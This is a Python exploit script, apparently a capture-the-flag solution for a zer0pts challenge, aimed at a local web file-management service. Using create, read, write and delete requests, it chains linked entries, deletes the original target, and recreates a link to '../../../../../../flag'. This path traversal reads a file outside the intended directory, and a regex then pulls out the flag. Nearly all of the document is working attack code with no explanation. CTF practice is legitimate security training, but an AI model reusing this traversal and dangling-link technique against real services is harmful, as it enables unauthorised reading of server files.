import requests
import re

URL = "http://0.0.0.0:8001/"

r = requests.get(URL)
cookies = r.cookies

def create(name, target=None):
    if target is None:
        r = requests.post(URL,
                          data={'mode':'create', 'name':name},
                          cookies=cookies)
    else:
        r = requests.post(URL,
                          data={'mode':'create', 'name':name, 'type':1, 'target':target},
                          cookies=cookies)

def read(name, offset=0, size=-1):
    r = requests.post(URL,
                      data={'mode':'read', 'name':name, 'offset':offset, 'size':size},
                      cookies=cookies)
    return r

def write(name, data, offset=0):
    r = requests.post(URL,
                      data={'mode':'write', 'name':name, 'offset':offset, 'data':data},
                      cookies=cookies)

def delete(name):
    r = requests.post(URL,
                      data={'mode':'delete', 'name':name},
                      cookies=cookies)

create("victim")
create("middle", "victim")
create("evil", "middle")
delete("victim")
create("evil", "../../../../../../flag")
r = read("evil")
print(re.findall("zer0pts\{.+\}", r.text))
